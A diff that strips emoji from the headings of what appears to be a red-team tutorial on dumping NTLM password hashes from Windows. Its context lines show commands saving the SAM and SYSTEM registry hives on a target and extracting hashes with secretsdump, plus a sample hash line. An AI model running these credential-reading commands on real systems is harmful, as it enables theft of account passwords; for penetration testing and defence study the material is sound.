@@ -1,10 +1,10 @@
 ---
-title: "🗃️ Dumping NTLM Hashes via Non-Interactive Shell (Windows)"
+title: "Dumping NTLM Hashes via Non-Interactive Shell (Windows)"
 date: 2026-01-13
 tags: ['windows', 'ntlm', 'hash-dumping', 'samdump2', 'secretsdump', 'impacket', 'hashcat', 'red-teaming', 'post-exploitation', 'password-cracking', 'offline-attacks', 'registry-hive', 'windows-security', 'privilege-escalation', 'active-directory']
 ---
 
-### Step 1: 💾 Save Registry Hives (SAM, SECURITY, SYSTEM)
+# Step 1: Save Registry Hives (SAM, SECURITY, SYSTEM)
 
 Run these commands on the target Windows machine:
 
@@ -19,7 +19,7 @@ reg.exe save hklm\system system
 
 ---
 
-# 🔍 Step 2: Extract Hashes from Saved Files
+# Step 2: Extract Hashes from Saved Files
 
 Two popular tools to extract NTLM hashes:
 
@@ -37,7 +37,7 @@ secretsdump.py -sam sam -system system LOCAL
 
 ---
 
-# 📄 Sample Output Explained
+# Sample Output Explained
 
 ```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
